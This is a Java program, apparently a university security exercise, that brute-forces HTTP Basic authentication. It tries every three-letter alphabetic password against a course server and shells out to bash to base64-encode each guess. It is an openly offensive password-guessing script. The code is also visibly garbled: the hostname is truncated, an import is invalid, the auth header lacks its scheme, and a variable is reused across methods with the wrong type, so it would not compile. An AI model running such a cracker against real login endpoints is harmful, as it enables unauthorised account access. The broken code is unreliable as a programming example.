import java.io.*;
import java.*;
import java.net.*;

public class BruteForce
{
   public static void main(String[] args) throws Exception
   {
      
     String password = checkPassword(); 

     System.out.println("Congratulations Your password is "+ password );
      
      

      URL url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
      HttpURLConnection sec = (HttpURLConnection)url.openConnection();
      sec.setRequestProperty("Authorization", " " + encode(":"+password));
      BufferedReader in = new BufferedReader(new InputStreamReader(sec.getInputStream()));
      String inputLine;

      while ((inputLine = in.readLine()) != null)
         System.out.println(inputLine);
      in.close();
  }

    

   private static String checkPassword() throws Exception
   {
      String Password=" ";
      int attempt=0;
      URL url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
      HttpURLConnection sec;
      String[] cad = {"a","b","c","d","e","f","g","h","i","j","k","l","m",
                      "n","o","p","q","r","s","t","u","v","w","x","y","z",
                      "A","B","C","D","E","F","G","H","I","J","K","L","M",
                      "N","O","P","Q","R","S","T","U","V","W","X","Y","Z"};

      for (int i=0; i < cad.length; i++)
      {
         for (int j=0; j< cad.length;j++)
         {
            for (int k=0; k<cad.length;k++)
            {
               attempt++;
               String Passwd = new String(cad[i]+cad[j]+cad[k]);
               String userPasswd= ":"+Passwd;
               System.out.println(attempt+" "+userPasswd);
              
               sec = (HttpURLConnection)url.openConnection();
               sec.setRequestProperty("Authorization", " " + encode(userPasswd));

               if (sec.getHeaderField(0).equals("HTTP/1.1 200 OK"))
               {
                  Password=Passwd;
                  return Password;
               }
               sec.disconnect();
            }  
         }  
      }  
      return "Password not found";
   }

   private static String encode(String userPasswd) throws Exception
   {
      String ad;
      String encodedUserPasswd=" ";
      String addr= "~//base64_encode.php "+userPasswd ;
      Process p = Runtime.getRuntime().exec(new String[]{"/usr/local//bash","-c", addr});
      BufferedReader resp = new BufferedReader(new InputStreamReader(p.getInputStream()));
      
      while ( (cad = resp.readLine()) != null )
      {
         
         encodedUserPasswd=cad;
      }
      return encodedUserPasswd;
    }
}

